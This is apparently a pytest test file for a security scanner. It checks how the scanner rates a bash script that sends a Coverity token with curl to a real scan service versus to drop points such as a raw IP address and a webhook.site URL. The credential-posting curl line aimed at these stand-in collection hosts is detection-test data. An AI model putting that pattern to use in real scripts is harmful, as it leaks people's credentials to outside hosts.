"""`SUSPECT.EXFIL.001` outside anything that runs on its own is recorded, unless the file names a
destination nobody sends their own credentials to (review 98)."""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config import Config
from cordon_scanner.foundation.models import Severity

UPLOAD = (
    "#!/bin/bash\n"
    'SCAN_URL="{destination}"\n'
    '[ -z "$COVERITY_SCAN_TOKEN" ] && echo "token must be set" && exit 1\n'
    'AUTH_RES=`curl -s --form project="$PROJECT" --form token="$COVERITY_SCAN_TOKEN" '
    "$SCAN_URL/api/upload_permitted`\n"
    "AUTH=`echo $AUTH_RES | ruby -e \"require 'json'; puts JSON[STDIN.read]['ok']\"`\n"
)


class TestOwnCredentialClient:
    @staticmethod
    def exfil(tmp_path, destination: str) -> list[Severity]:
        (tmp_path / "coverity.sh").write_text(
            UPLOAD.format(destination=destination), encoding="utf-8"
        )
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return [f.severity for f in result.findings if f.rule_id == "SUSPECT.EXFIL.001"]

    def test_a_script_sending_its_token_to_its_service_is_recorded(self, tmp_path) -> None:
        found = self.exfil(tmp_path, "https://scan.example.com")
        assert found and all(severity <= Severity.LOW for severity in found)

    @pytest.mark.parametrize("destination", ["http://203.0.113.9", "https://webhook.site/abc"])
    def test_one_naming_a_drop_point_is_not(self, tmp_path, destination: str) -> None:
        found = self.exfil(tmp_path, destination)
        assert found and all(severity >= Severity.MEDIUM for severity in found)
